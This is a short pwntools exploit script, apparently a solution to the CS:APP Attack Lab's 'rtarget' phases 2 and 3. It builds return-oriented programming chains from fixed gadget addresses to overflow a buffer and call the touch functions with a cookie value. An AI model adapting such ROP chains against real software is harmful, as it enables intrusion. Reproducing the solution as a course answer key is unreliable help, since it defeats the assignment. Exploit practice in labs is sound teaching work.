from pwn import *
import sys

def debug(argv = ''):
    gdb.attach(io, argv)
    pause()

context.arch='amd64'
context.log_level = 'debug'
io = process(argv=['./rtarget','-q'])

if sys.argv[1] == '--touch2':
    io.recvline()
    debug('b * getbuf')
    pop_rax = 0x4019ab
    mov_rax_rdi = 0x4019c5
    touch2_addr = 0x4017ec
    payload = flat([b'\x00'*0x28, pop_rax, 0x59b997fa, mov_rax_rdi,touch2_addr])
    io.sendline(payload)
    io.interactive()
elif sys.argv[1] == '--touch3':
    io.recvline()
    debug('b * getbuf')
    mov_rax_rdi = 0x4019c5
    mov_rsp_rax = 0x401aad
    pop_rax = 0x4019ab
    mov_eax_edx = 0x4019dd
    mov_ecx_esi = 0x401a13
    mov_edx_ecx = 0x401a69
    add_rdi_rsi_to_rax = 0x4019d6
    touch3_addr = 0x004018fa
    payload = flat([b'\x00'*0x28,mov_rsp_rax,mov_rax_rdi, pop_rax,0x48,mov_eax_edx,mov_edx_ecx, mov_ecx_esi, add_rdi_rsi_to_rax,mov_rax_rdi,touch3_addr,b'59b997fa\x00'])
    io.sendline(payload)
    io.interactive()
